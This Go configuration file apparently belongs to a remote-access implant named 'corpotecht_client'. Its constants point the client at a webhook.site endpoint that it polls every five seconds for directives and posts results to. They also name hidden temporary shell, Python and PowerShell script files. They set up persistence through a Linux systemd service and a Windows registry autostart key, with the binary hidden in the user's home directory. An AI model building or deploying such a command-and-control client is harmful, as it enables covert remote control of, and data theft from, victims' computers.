package config

import "time"

// General
const (
	Version              = "0.2"
	PostResultEndpoint   = "https://webhook.site/d0b32da2-cd4a-4163-95ae-f3bd5ae0656c"
	GetDirectiveEndpoint = "https://webhook.site/d0b32da2-cd4a-4163-95ae-f3bd5ae0656c"
	Logging              = true
	PingInterval         = 5 * time.Second // time after which it pings server again for new directives
)

// Linux Specific
const (
	LinuxTerminalLocation = "/bin/bash"
	LinuxBlobName         = "corpotecht_client"
	LinuxSystemdService   = "corpotecht_client.service"
	LinuxBlobLocation     = "/.config/corpotecht_client/" // relative to homedir (start and end with /)
	LinuxShellScriptName  = ".temp_shell_script.sh"
	LinuxPythonScriptName = ".temp_python_script.py"
)

// Windows Specific
const (
	WindowsAutostart         = true
	WindowsBlobName          = "corpotecht_client.exe"
	WindowsRegistryKey       = "CorpotechtClient"
	WindowsPWShellScriptName = "temp_ps_script.ps1"
)
